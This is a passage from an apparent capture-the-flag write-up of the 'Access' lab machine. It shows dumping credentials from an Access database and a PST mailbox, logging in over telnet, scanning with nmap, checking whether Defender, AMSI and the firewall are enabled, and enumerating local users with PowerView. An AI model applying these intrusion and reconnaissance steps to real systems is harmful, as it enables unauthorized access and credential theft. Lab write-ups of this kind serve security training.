+</span><span class="z-source z-shell z-bash">    <span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">count</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>gt</span> 0 <span class="z-support z-function z-test z-end z-shell">]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Table: <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">table</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mdb-export</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">mdb_file</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">table</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>e</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>\n---------------------------------------\n<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">    <span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-end z-shell">done</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-exit z-shell">exit</span></span><span class="z-meta z-function-call z-arguments z-shell"> 0</span>
+</span></code></pre>
+<p>I'll save it as <code>access_enumerator.sh</code>, I'll change its permissions, and I'll run it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> /workspace/access_enumerator.sh /workspace/ftp/Backups/backup.mdb</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">---------------------------------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Table: auth_user
+</span><span class="z-text z-plain">id,username,password,Status,last_login,RoleID,Remark
+</span><span class="z-text z-plain">25,&quot;admin&quot;,&quot;admin&quot;,1,&quot;08/23/18 21:11:47&quot;,26,
+</span><span class="z-text z-plain">27,&quot;engineer&quot;,&quot;access4u@security&quot;,1,&quot;08/23/18 21:13:36&quot;,26,
+</span><span class="z-text z-plain">28,&quot;backup_admin&quot;,&quot;admin&quot;,1,&quot;08/23/18 21:14:02&quot;,26,
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">---------------------------------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>That's a lot of output!</p>
+<p>The <code>auth_user</code> table content looks really interesting to me. It contains three potential credentials!</p>
+<p>I tried them with Telnet, but they didn't work. However, the <code>engineer</code>:<code>access4u@security</code> returned a 'Access Denied: Specified user is not a member of TelnetClients group' message, so we can assume that this user does exist.</p>
+<h3 id="exploring-the-shares-1">Exploring the shares</h3>
+<p>Earlier, we noticed that the <code>Engineer</code> folder was comprised of a <code>Access Control.zip</code> file. Let's get its content:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> unzip<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/ftp/Engineer/Access Control.zip<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Archive:  /workspace/ftp/Engineer/Access Control.zip
+</span><span class="z-text z-plain">  Length      Date    Time    Name
+</span><span class="z-text z-plain">---------  ---------- -----   ----
+</span><span class="z-text z-plain">   271360  2018-08-24 01:13   Access Control.pst
+</span><span class="z-text z-plain">---------                     -------
+</span><span class="z-text z-plain">   271360                     1 file
+</span></code></pre>
+<p>Okay, so it contains a <code>Access Control.pst</code> file. Let's unzip it now:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> unzip <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/ftp/Engineer/Access Control.zip<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> /workspace/</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Archive:  /workspace/ftp/Engineer/Access Control.zip
+</span><span class="z-text z-plain">   skipping: Access Control.pst      unsupported compression method 99
+</span></code></pre>
+<p>It doesn't work. Let's try a different tool:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> 7z x <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/ftp/Engineer/Access Control.zip<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Extracting archive: /workspace/ftp/Engineer/Access Control.zip
+</span><span class="z-text z-plain">--
+</span><span class="z-text z-plain">Path = /workspace/ftp/Engineer/Access Control.zip
+</span><span class="z-text z-plain">Type = zip
+</span><span class="z-text z-plain">Physical Size = 10870
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    
+</span><span class="z-text z-plain">Enter password (will not be echoed):
+</span></code></pre>
+<p>We're asked to enter a password. Let's try the one for <code>engineer</code>.</p>
+<pre class="z-code"><code><span class="z-text z-plain">Everything is Ok         
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Size:       271360
+</span><span class="z-text z-plain">Compressed: 10870
+</span></code></pre>
+<p>It worked!</p>
+<p>Now we have a <code>Access Control.pst</code> file in <code>/workspace</code>. It's really cool but... what is it used for?</p>
+<blockquote>
+<p>A file with the .PST file extension is an Outlook Personal Information Store file that stores personal information used in Microsoft Outlook or Microsoft Exchange. They might include messages, contacts, attachments, addresses, and more.</p>
+<p>— <a href="https://www.lifewire.com/pst-file-4140356">Lifewire</a></p>
+</blockquote>
+<p>Alright! Looks like we have no enumerate another file.</p>
+<h3 id="enumerating-access-control-pst">Enumerating <code>Access Control.pst</code></h3>
+<p>Once again, there's a CLI tool we can use on Kali Linux to open <code>.pst</code> files. This time, it's named <code>readpst</code>. Luckily, it's easier to use than <code>mdbtools</code>, no need to write a script here!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> readpst<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>D</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>M</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>b</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> /workspace/ <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/Access Control.pst<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Opening PST file and indexes...
+</span><span class="z-text z-plain">Processing Folder &quot;Deleted Items&quot;
+</span><span class="z-text z-plain">        &quot;Access Control&quot; - 2 items done, 0 items skipped.
+</span></code></pre>
+<p>Now we have a <code>Access Control</code> folder in <code>/workspace</code> containing a text file. Let's get its content:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/Access Control/2<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Status: RO
+</span><span class="z-text z-plain">From: john@megacorp.com &lt;john@megacorp.com&gt;
+</span><span class="z-text z-plain">Subject: MegaCorp Access Control System &quot;security&quot; account
+</span><span class="z-text z-plain">To: &#39;security@accesscontrolsystems.com&#39;
+</span><span class="z-text z-plain">Date: Thu, 23 Aug 2018 23:44:07 +0000
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Hi there,
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain"> 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain"> 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Regards,
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">John
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's a lot of garbage, but we can clearly see a message from <code>john@megacorp.com</code> to <code>security@accesscontrolsystems.com</code>. Apparently, the password for the <code>security</code> account has been changed to <code>4Cc3ssC0ntr0ller</code>!</p>
+<h3 id="known-cves">Known CVEs</h3>
+<p>Just for good measure, let's check if FTP is vulnerable to known exploits.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.98<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 21<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>script</span> vuln</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">21/tcp open  ftp
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Nothing!</p>
+<h1 id="foothold-telnet">Foothold (Telnet)</h1>
+<p>Let's try the credentials we found to connect to Access over Telnet.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> telnet 10.10.10.98</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Trying 10.10.10.98...
+</span><span class="z-text z-plain">Connected to 10.10.10.98.
+</span><span class="z-text z-plain">Escape character is &#39;^]&#39;.
+</span><span class="z-text z-plain">Welcome to Microsoft Telnet Service 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">login: security
+</span><span class="z-text z-plain">password: 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">*===============================================================
+</span><span class="z-text z-plain">Microsoft Telnet Server.
+</span><span class="z-text z-plain">*===============================================================
+</span><span class="z-text z-plain">C:\Users\security&gt;
+</span></code></pre>
+<p>They worked!</p>
+<p>It's a standard one though, so I'll transform it into a Powershell session.</p>
+<h1 id="local-enumeration">Local enumeration</h1>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>access\security</code>.</p>
+<h2 id="version">Version</h2>
+<p>Let's gather some information about the Windows version of Access.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v ProductName
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    ProductName    REG_SZ    Windows Server 2008 R2 Standard
+</span></code></pre>
+<p>Okay, so this is Windows Server 2008!</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v CurrentBuildNumber
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    CurrentBuildNumber    REG_SZ    7600
+</span></code></pre>
+<p>And this is build <code>7600</code>.</p>
+<p>This version of Windows is a bit old, and maybe there are missing hotfixes. We'll check that later, if we can't find another way to get <code>NT AUTHORITY\SYSTEM</code>.</p>
+<h2 id="architecture">Architecture</h2>
+<p>What is Access's architecture?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v PROCESSOR_ARCHITECTURE
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+</span><span class="z-text z-plain">    PROCESSOR_ARCHITECTURE    REG_SZ    AMD64
+</span></code></pre>
+<p>So this system is using x64. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="windows-defender">Windows Defender</h2>
+<p>Let's check if Windows Defender is enabled.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>v ProductStatus
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender
+</span><span class="z-text z-plain">    ProductStatus    REG_DWORD    0x0
+</span></code></pre>
+<p>It's disabled! That's great, it will make our life easier.</p>
+<h2 id="amsi">AMSI</h2>
+<p>Let's check if there's any AMSI provider.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ERROR: The system was unable to find the specified registry key or value.
+</span></code></pre>
+<p>No output. Let's assume there's none then!</p>
+<h2 id="firewall">Firewall</h2>
+<p>Let's see which Windows Firewall policies profiles are enabled.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> reg query <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">/</span>s <span class="z-keyword z-operator z-assignment z-powershell">/</span>v EnableFirewall
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x1
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x1
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile
+</span><span class="z-text z-plain">    EnableFirewall    REG_DWORD    0x1
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">End of search: 3 match(es) found.
+</span></code></pre>
+<p>Okay, so all Firewall profiles are enabled. It shouldn't hinder our progression too much though: since we alreay managed to obtain a reverse shell, the protections should be really basic.</p>
+<h2 id="nics">NICs</h2>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> ipconfig <span class="z-keyword z-operator z-assignment z-powershell">/</span>all
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Windows IP Configuration
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Host Name . . . . . . . . . . . . : ACCESS
+</span><span class="z-text z-plain">   Primary Dns Suffix  . . . . . . . : 
+</span><span class="z-text z-plain">   Node Type . . . . . . . . . . . . : Hybrid
+</span><span class="z-text z-plain">   IP Routing Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   WINS Proxy Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Ethernet adapter Local Area Connection:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-50-56-B9-69-64
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : Yes
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span><span class="z-text z-plain">   IPv6 Address. . . . . . . . . . . : dead:beef::3cdd:9914:8d07:885(Preferred) 
+</span><span class="z-text z-plain">   Link-local IPv6 Address . . . . . : fe80::3cdd:9914:8d07:885%11(Preferred) 
+</span><span class="z-text z-plain">   IPv4 Address. . . . . . . . . . . : 10.10.10.98(Preferred) 
+</span><span class="z-text z-plain">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+</span><span class="z-text z-plain">   Default Gateway . . . . . . . . . : 10.10.10.2
+</span><span class="z-text z-plain">   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
+</span><span class="z-text z-plain">                                       fec0:0:0:ffff::2%1
+</span><span class="z-text z-plain">                                       fec0:0:0:ffff::3%1
+</span><span class="z-text z-plain">   NetBIOS over Tcpip. . . . . . . . : Enabled
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Tunnel adapter isatap.{851F7B02-1B91-4636-BB2A-AAC45E5735BC}:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Media State . . . . . . . . . . . : Media disconnected
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span></code></pre>
+<p>Looks like there's a single network.</p>
+<h2 id="local-users">Local users</h2>
+<p>Let's enumerate all local users using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName Users <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-single z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&#39;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&#39;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> GroupName<span class="z-keyword z-operator z-other z-powershell">,</span> MemberName<span class="z-keyword z-operator z-other z-powershell">,</span> SID <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GroupName MemberName           SID
+</span><span class="z-text z-plain">--------- ----------           ---
+</span><span class="z-text z-plain">Users     ACCESS\Administrator S-1-5-21-953262931-566350628-63446256-500
+</span><span class="z-text z-plain">Users     ACCESS\security      S-1-5-21-953262931-566350628-63446256-1001
+</span><span class="z-text z-plain">Users     ACCESS\engineer      S-1-5-21-953262931-566350628-63446256-1002
+</span></code></pre>
+<p>So apart from us, there's also <code>engineer</code> (as we discovered while trying to connect over Telnet) and <code>Administrator</code>.</p>
+<h2 id="local-groups">Local groups</h2>
+<p>Let's enumerate all local groups, once again using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroup</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> GroupName<span class="z-keyword z-operator z-other z-powershell">,</span> Comment <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Out-String</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Width <span class="z-constant z-numeric z-integer z-powershell">4096</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GroupName                      Comment                           
+</span><span class="z-text z-plain">---------                      -------                           
+</span><span class="z-text z-plain">Administrators                 Administrators have complete and unrestricted access to the computer/domain
+</span><span class="z-text z-plain">Backup Operators               Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
+</span><span class="z-text z-plain">Certificate Service DCOM Access Members of this group are allowed to connect to Certification Authorities in the enterprise
+</span><span class="z-text z-plain">Cryptographic Operators        Members are authorized to perform cryptographic operations.
+</span><span class="z-text z-plain">Distributed COM Users          Members are allowed to launch, activate and use Distributed COM objects on this machine.
+</span><span class="z-text z-plain">Event Log Readers              Members of this group can read event logs from local machine
+</span><span class="z-text z-plain">Guests                         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
+</span><span class="z-text z-plain">IIS_IUSRS                      Built-in group used by Internet Information Services.
+</span><span class="z-text z-plain">Network Configuration Operators Members in this group can have some administrative privileges to manage configuration of networking features
+</span><span class="z-text z-plain">Performance Log Users          Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
+</span><span class="z-text z-plain">Performance Monitor Users      Members of this group can access performance counter data locally and remotely
+</span><span class="z-text z-plain">Power Users                    Power Users are included for backwards compatibility and possess limited administrative powers
+</span><span class="z-text z-plain">Print Operators                Members can administer domain printers
+</span><span class="z-text z-plain">Remote Desktop Users           Members in this group are granted the right to logon remotely
+</span><span class="z-text z-plain">Replicator                     Supports file replication in a domain
+</span><span class="z-text z-plain">Users                          Users are prevented from making accidental or intentional system-wide changes and can run most applications
+</span><span class="z-text z-plain">TelnetClients
+</span></code></pre>
+<p>Looks classic.</p>
+<h2 id="user-account-information">User account information</h2>
+<p>Let's gather more information about us.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> net user security
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">User name                    security
+</span><span class="z-text z-plain">Full Name                    security
+</span><span class="z-text z-plain">Comment
+</span><span class="z-text z-plain">User&#39;s comment
+</span><span class="z-text z-plain">Country code                 000 (System Default)
+</span><span class="z-text z-plain">Account active               Yes
+</span><span class="z-text z-plain">Account expires              Never
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Password last set            8/22/2018 9:14:57 PM
+</span><span class="z-text z-plain">Password expires             Never
+</span><span class="z-text z-plain">Password changeable          8/22/2018 9:14:57 PM
+</span><span class="z-text z-plain">Password required            Yes
+</span><span class="z-text z-plain">User may change password     No
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Workstations allowed         All
+</span><span class="z-text z-plain">Logon script
+</span><span class="z-text z-plain">User profile 
+</span><span class="z-text z-plain">Home directory
+</span><span class="z-text z-plain">Last logon                   12/25/2023 12:37:29 PM
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Logon hours allowed          All
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Local Group Memberships      *TelnetClients        *Users
+</span><span class="z-text z-plain">Global Group memberships     *None
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We don't belong to interesting groups.</p>
+<h2 id="home-folder">Home folder</h2>
+<p>If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.</p>
